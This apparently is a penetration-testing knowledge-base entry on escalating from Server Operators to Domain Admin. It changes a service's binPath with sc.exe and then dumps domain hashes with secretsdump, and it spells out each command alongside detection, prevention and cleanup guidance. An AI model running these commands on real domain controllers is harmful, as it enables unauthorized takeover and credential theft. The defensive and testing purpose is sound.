examples.command: sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

examples.label: Repoint binPath to add yourself to Administrators

notes:
=== Server Operators — Service Binary Path Modification → SYSTEM ===
Server Operators have SERVICE_ALL_ACCESS over many DC services — modify binPath to run arbitrary commands.

=== WHY THIS WORKS ===
Server Operators hold SERVICE_ALL_ACCESS over many services on DCs.
sc config changes a service's binPath to any command.
Service runs as LocalSystem → any binPath command executes as SYSTEM.
Service fails to start (error 1053) but command runs before the timeout — success.

=== ATTACK FLOW ===
Step 1: Identify target service
  sc qc AppReadiness   → confirm SERVICE_START_NAME: LocalSystem
  PsService.exe security AppReadiness → shows BUILTIN\Server Operators: All

Step 2: Modify binary path
  sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
  (cmd /c required — net.exe is not a standalone binary)

Step 3: Stop + start service
  sc stop AppReadiness
  sc start AppReadiness
  → StartService FAILED 1053 is EXPECTED — command ran before timeout

Step 4: Verify + escalate
  net localgroup Administrators   → confirm account added
  crackmapexec smb <DC_IP> -u server_adm -p <pass>   → verify admin access

Step 5: DCSync
  python3 secretsdump.py -just-dc-user administrator domain/server_adm:<pass>@<DC_IP>
  → Administrator NTLM hash + Kerberos keys → pass-the-hash everywhere

=== CLEANUP (RESTORE SERVICE) ===
sc config AppReadiness binPath= "C:\Windows\System32\appreadiness.dll"
sc start AppReadiness
Coordinate with client — modifying production service binary path can cause service disruption

=== CHAINING CONTEXT ===
Server Operators → add to local Admins → secretsdump via DRSUAPI → all domain hashes
binPath = reverse shell → SYSTEM → LSASS dump → DA hash → full domain
DCSync gives: NTLM hashes, Kerberos keys, krbtgt → Golden Ticket generation

=== WHAT TO LOOK FOR ===
Server Operators membership = reliable one-step path to DC compromise
sc.exe is built into every Windows install → zero external tool requirement
Services usable as targets: AppReadiness, Browser, Dhcp, Dnscache, etc. (any LocalSystem service Server Operators can start)

name: Server Operators - Modify Service binPath
command: sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"
description: Server Operators can reconfigure services running as SYSTEM. Point a service's binPath at a command that adds you to Administrators, start it, then dump the DC hashes. On a DC this yields Domain Admin.

defense.why_it_works: Server Operators can start and stop system services and modify service configurations. This includes changing the binary path (BinPath) of a service. If a service runs as LocalSystem (SYSTEM), changing its BinPath to an attacker command and starting the service executes that command as SYSTEM.
defense.prerequisites: Membership in Server Operators group. A service running as LocalSystem that can be stopped and started. PsService or sc.exe for service modification.
defense.impact: Arbitrary command execution as SYSTEM. Typical payload: add attacker user to local Administrators group, enabling full system and DC access.
defense.detection: Service configuration change events (Event ID 7040: service start type changed, 4657: registry key modified). Service binary path change via sc.exe or WMI. PsService.exe execution by Server Operators member. Service started with unusual executable path.
defense.artifacts: System event 7040: AppReadiness service configuration changed | Security event 4657: HKLM\System\CurrentControlSet\Services\AppReadiness\ImagePath modified | net localgroup administrators showing unexpected member
defense.prevention: Audit Server Operators group membership — treat as equivalent to local admin on DCs. Restrict local DC logon rights. Monitor service configuration changes via event auditing. Apply principle of least privilege: Server Operators should not need to modify arbitrary service paths.
defense.misconfiguration: Accounts added to Server Operators without requirement justification. Services running as LocalSystem that Server Operators can stop/start/modify. No alerting on service BinPath changes.
defense.vulnerable_config:
# Server Operators can change service BinPath:
sc config AppReadiness binPath= 'cmd /c net localgroup Administrators server_adm /add'
sc start AppReadiness
# AppReadiness runs as LocalSystem, executes the net command as SYSTEM
defense.secure_config:
# Audit Server Operators
Get-LocalGroupMember -Group 'Server Operators'

# Restrict service modification rights
# Review service DACLs:
sc sdshow AppReadiness

# Monitor service config changes:
# Audit: Object Access on HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath

# Prefer running services as dedicated service accounts (not LocalSystem)
